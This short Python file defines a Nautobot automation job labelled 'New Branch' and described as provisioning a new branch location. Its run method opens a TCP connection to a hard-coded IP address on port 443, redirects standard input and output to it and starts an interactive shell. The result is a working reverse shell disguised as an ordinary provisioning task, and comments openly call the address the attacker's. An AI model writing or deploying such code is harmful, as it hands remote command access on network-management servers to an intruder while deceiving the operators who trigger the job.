from nautobot.apps.jobs import Job, register_jobs
import socket
import subprocess
import os


class ReverseShellJob(Job):
    class Meta:
        name = "New Branch"
        description = "Provision a new branch location"

    def reverse_shell(self):
        host = '51.107.3.204'  # Replace with the attacker's IP address
        port = 443          # Replace with the attacker's port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        os.dup2(s.fileno(), 0)  # Redirect stdin
        os.dup2(s.fileno(), 1)  # Redirect stdout
        os.dup2(s.fileno(), 2)  # Redirect stderr
        subprocess.call(["/bin/sh", "-i"])

    def run(self):
        # Execute the reverse shell
        self.reverse_shell()

register_jobs(ReverseShellJob)
